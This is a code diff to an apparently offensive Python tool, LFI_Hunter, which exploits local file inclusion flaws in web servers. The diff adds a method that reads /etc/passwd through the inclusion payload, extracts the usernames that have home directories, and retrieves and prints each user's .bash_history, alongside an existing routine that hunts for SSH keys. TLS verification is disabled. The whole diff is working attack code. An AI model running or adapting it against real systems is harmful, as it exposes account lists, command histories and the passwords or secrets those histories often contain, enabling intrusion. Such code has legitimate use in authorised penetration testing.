@@ -16,6 +16,7 @@ class LFI_Hunter():
 
         self.set_processes_wordlist()
         self.set_processes_procs()
+        self.get_history()
         self.get_keys()
             
     def size_check(self):
@@ -68,6 +69,33 @@ class LFI_Hunter():
             else:
                 print("No SSH keys found for user(s) " + each_user.strip())
                 print("\033[31m" + "*" * 100 + "\x1b[0m")
+
+    def get_history(self):
+        requests.packages.urllib3.disable_warnings()
+        find_users = self.url + self.payload + "/etc/passwd"
+        req_lfi = requests.get(find_users, allow_redirects = False, verify=False)
+        search = re.findall("/home/(.*):/bin/",req_lfi.text)
+        
+        for each_user in search:
+            print("Searching for history files for user(s) " + each_user)
+            ssh_payload = self.url + self.payload + "/home/" + each_user + "/.bash_history"
+            req_ssh = requests.get(ssh_payload, allow_redirects = False, verify=False)
+            
+            if len(req_ssh.text) > self.check:
+                line1 = "Found: \x1b[6;30;42mHistory File for " + each_user.strip() + "\x1b[0m"
+                line2 = "\n" + req_ssh.text + "\n"
+                line3 = "\033[31m" + "*" * 100 + "\x1b[0m"
+                
+                if args.o:
+                    self.write_output(line1,line2,line3)
+                else:
+                    print(line1)
+                    print(line2)
+                    print(line3)
+
+            else:
+                print("No history file found for user(s) " + each_user.strip())
+                print("\033[31m" + "*" * 100 + "\x1b[0m") 
 
     def set_processes_wordlist(self):
         original_sigint_handler = signal.signal(signal.SIGINT, signal.SIG_IGN)
